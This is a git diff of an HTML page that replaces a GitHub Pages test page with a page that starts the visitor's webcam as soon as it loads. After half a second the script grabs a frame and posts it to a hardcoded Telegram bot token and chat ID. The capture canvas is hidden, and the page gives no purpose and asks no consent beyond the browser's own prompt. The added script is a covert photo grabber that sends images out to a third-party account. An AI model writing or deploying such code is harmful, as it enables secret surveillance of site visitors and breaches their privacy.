@@ -3,26 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub Pages Test</title>
+    <title>Camera Capture and Send to Telegram</title>
     <style>
         body {
+            margin: 0;
+            padding: 0;
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            color: #fff;
+            background: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
             text-align: center;
-            padding-top: 50px;
         }
 
         h1 {
-            color: #333;
+            margin-bottom: 20px;
         }
 
-        p {
-            color: #555;
+        canvas {
+            display: none; /* لإخفاء الكاميرا، سنستخدمها فقط لالتقاط الصورة */
+        }
+
+        .success, .error {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .success {
+            color: #28a745;
+        }
+
+        .error {
+            color: #dc3545;
         }
     </style>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 </head>
 <body>
-    <h1>GitHub Pages is Working!</h1>
-    <p>If you see this, GitHub Pages is properly configured.</p>
+    <div class="container">
+        <h1>Camera Capture and Send to Telegram</h1>
+        <video id="videoElement" width="640" height="480" autoplay></video>
+        <canvas id="canvasElement"></canvas>
+        <div id="response" class=""></div>
+    </div>
+
+    <script>
+        const TOKEN = "7938645268:AAH8CVrGDCVD419bVecj cHz5kbH8Ep67s4Y"; // التوكن الجديد
+        const CHAT_ID = "6769524326"; // استبدلها بالـ chat_id الخاص بك
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`; // تم استخدام HTTPS هنا
+
+        // الحصول على الفيديو من الكاميرا
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const context = canvas.getContext('2d');
+        const responseDiv = document.getElementById('response');
+
+        // بدء الكاميرا تلقائيًا عند دخول المستخدم للموقع
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+                // تأخير صغير قبل التقاط الصورة
+                setTimeout(function() {
+                    captureAndSend();
+                }, 500); // 0.5 ثانية (تأخير صغير)
+            })
+            .catch(function(err) {
+                console.log("Error accessing the camera: ", err);
+                responseDiv.textContent = "Failed to access the camera.";
+                responseDiv.className = "error";
+            });
+
+        // دالة لالتقاط الصورة وإرسالها
+        function captureAndSend() {
+            // رسم صورة من الفيديو إلى الـ canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة إلى Base64
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            // إرسال الصورة إلى تيليجرام
+            sendToTelegram(imageData);
+        }
+
+        // دالة لإرسال الصورة إلى بوت تيليجرام
+        function sendToTelegram(imageData) {
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                photo: imageData // إرسال الصورة كـ بيانات Base64
+            })
+            .then(response => {
+                responseDiv.textContent = "Image sent successfully!";
+                responseDiv.className = "success";
+            })
+            .catch(error => {
+                console.error("Failed to send image:", error);
+                responseDiv.textContent = "Failed to send image.";
+                responseDiv.className = "error";
+            });
+        }
+    </script>
 </body>
 </html>
